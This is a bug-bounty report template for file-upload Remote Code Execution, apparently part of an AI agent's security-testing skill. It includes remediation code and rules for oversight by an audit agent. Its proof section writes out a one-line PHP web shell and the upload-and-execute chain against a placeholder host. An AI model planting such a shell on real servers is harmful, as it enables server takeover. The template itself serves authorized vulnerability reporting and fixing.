---
name: RCE Report Template
description: Template for Remote Code Execution vulnerability reports in SRC format
category: code_execution
severity: critical
trigger: User can execute arbitrary code on the server
---

# RCE Vulnerability Report

## 1. 漏洞概述
- 漏洞類型：Remote Code Execution (RCE)
- 業務影響：伺服器接管、資料洩露、橫向移動立足點

## 2. 漏洞證明（以檔案上傳型為例）

### 2.1 環境
- 目標：`https://target-app.com/api/upload`
- 系統：Linux + PHP 7.4

### 2.2 漏洞鏈路
```
1. 上傳 shell.php（內容：<?php system($_GET['cmd']); ?>）
2. 伺服器儲存至 /uploads/shell.php 且未改副檔名
3. GET /uploads/shell.php?cmd=id → 回傳 uid（RCE 成立）
```

### 2.3 取證紀律（對照 src-hunter 紅線）
- 僅執行 `id` / `whoami` 證明權限，禁止任何破壞性命令
- 禁止 `rm`/寫入系統檔案/建立持久化；證明即停

### 2.4 預期 vs 實際
- 預期：上傳被 MIME 白名單攔截，或儲存為不可執行
- 實際：檔案可直接被直譯器執行

## 3. 漏洞成因
僅檢查副檔名未檢查內容（MIME/魔數）；儲存路徑位於 Web 可執行目錄；未隔離沙箱。

## 4. 修復建議
```go
// 修復：MIME 白名單 + 隨機檔名 + 去執行權限
mimeType := detectContentType(file)
if !allowed(mimeType) { http.Error(w, "forbidden", 403); return }
dest := path.Join(uploadDir, randomName()+".bin") // 去掉可執行副檔名
os.WriteFile(dest, data, 0644)
```
儲存目錄禁用直譯器執行（nginx location 或 .htaccess 限制）。

## 5. 評分與對照
- CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- OWASP: A03:2021 Injection；CWE-434（上傳）/ CWE-94（執行）
- src-hunter-skill 底層案例：RCE 385 例

## 6. 復驗步驟
1. 重新上傳雙副檔名/Content-Type 偽造 payload
2. 確認儲存後不可執行（404 或 403 或純文字回顯）

## 7. HITL 審計規則
- 上傳/寫入類工具呼叫無 MIME 校驗敘述 → 審計 Agent 需重點審查
- 對已授權目標的利用 payload 屬 approve 範圍（對照 config.yaml audit_agent_prompt「必須 approve」清單）
